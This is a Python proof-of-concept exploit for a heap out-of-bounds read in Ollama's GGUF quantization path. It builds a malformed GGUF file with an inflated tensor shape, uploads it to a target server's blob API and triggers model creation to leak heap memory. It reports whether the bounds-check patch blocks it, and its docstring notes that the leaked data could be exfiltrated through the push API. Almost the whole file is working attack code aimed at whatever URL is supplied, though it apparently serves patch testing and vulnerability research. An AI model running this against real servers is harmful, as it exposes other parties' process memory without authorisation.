#!/usr/bin/env python3
"""
Bleeding Llama PoC for Ollama v0.24.0 (CVE-2026-7482)

Tests the quantization heap read vulnerability by:
1. Crafting a minimal GGUF with F16 tensor, exaggerated shape
2. Uploading via /api/blobs/
3. Creating model with quantize=F32 to trigger the vulnerable code path
4. (If unpatched) Exfiltrating via /api/push

On v0.24.0+: Blocked by tensor bounds check at gguf.go:260
On v0.23.x and earlier: Heap memory leak via out-of-bounds fp16 read

Usage: python3 poc_bleeding_llama.py http://target:11434 [model_name]
"""
import hashlib, io, struct, sys, json
import urllib.request, urllib.error

TARGET = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:11434"
MODEL_NAME = sys.argv[2] if len(sys.argv) > 2 else "leak-test"

DECLARED_ELEMENTS = 1000000
F16_TYPE = 1
ACTUAL_DATA_BYTES = 1024
GGUF_ALIGNMENT = 32


def write_kv_string(buf, key, value):
    v = value.encode() if isinstance(value, str) else value
    buf += struct.pack('<Q', len(key)) + key
    buf += struct.pack('<I', 8)
    buf += struct.pack('<Q', len(v)) + v


def write_kv_u32(buf, key, value):
    buf += struct.pack('<Q', len(key)) + key
    buf += struct.pack('<I', 4)
    buf += struct.pack('<I', value)


def write_tensor_info(buf, name, shape, dtype, offset):
    buf += struct.pack('<Q', len(name)) + name
    buf += struct.pack('<I', len(shape))
    for d in shape:
        buf += struct.pack('<Q', d)
    buf += struct.pack('<I', dtype)
    buf += struct.pack('<Q', offset)


def craft_malicious_gguf():
    buf = bytearray()
    n_tensors, n_kv = 1, 2
    kv_buf = bytearray()
    write_kv_string(kv_buf, b'general.architecture', 'llama')
    write_kv_u32(kv_buf, b'general.file_type', F16_TYPE)
    shape = [DECLARED_ELEMENTS, 1]
    ti_buf = bytearray()
    write_tensor_info(ti_buf, b'test.weight', shape, F16_TYPE, 0)

    buf += b'GGUF'
    buf += struct.pack('<I', 3)
    buf += struct.pack('<Q', n_tensors) + struct.pack('<Q', n_kv)
    buf += kv_buf + ti_buf
    r = len(buf) % GGUF_ALIGNMENT
    if r: buf += b'\x00' * (GGUF_ALIGNMENT - r)
    buf += b'\x00' * ACTUAL_DATA_BYTES
    return bytes(buf)


def upload_blob(data, target):
    digest = 'sha256:' + hashlib.sha256(data).hexdigest()
    req = urllib.request.Request(f"{target}/api/blobs/{digest}", data=data, method='POST',
        headers={'Content-Type': 'application/octet-stream'})
    try:
        urllib.request.urlopen(req, timeout=30)
        return digest
    except urllib.error.HTTPError as e:
        print(f"  Upload error: {e.code}")
        return None


def create_model(digest, model_name, target):
    body = json.dumps({"model": model_name, "files": {"model.gguf": digest}, "quantize": "F32", "stream": False}).encode()
    req = urllib.request.Request(f"{target}/api/create", data=body, headers={'Content-Type': 'application/json'})
    try:
        resp = urllib.request.urlopen(req, timeout=120)
        return True, resp.read().decode()
    except urllib.error.HTTPError as e:
        return False, e.read().decode()


if __name__ == '__main__':
    print(f"[*] Target: {TARGET}")
    print(f"[*] Declared: {DECLARED_ELEMENTS} elements, Actual: {ACTUAL_DATA_BYTES} bytes")
    gguf = craft_malicious_gguf()
    with open('/tmp/poc_bleeding_llama.gguf', 'wb') as f: f.write(gguf)
    print(f"[*] GGUF: {len(gguf)} bytes")

    digest = upload_blob(gguf, TARGET)
    if not digest: sys.exit(1)
    print(f"[*] Blob: {digest[:30]}...")

    ok, resp = create_model(digest, MODEL_NAME, TARGET)
    if ok:
        print(f"[+] Model created (should not happen on v0.24.0+)")
    else:
        print(f"[-] Blocked: {resp[:200]}")
        if "exceeds file size" in resp:
            print("[*] Tensor bounds check (gguf.go:260) is active - PATCHED")
        elif "offset+size" in resp:
            print("[*] Offset validation active - PATCHED")
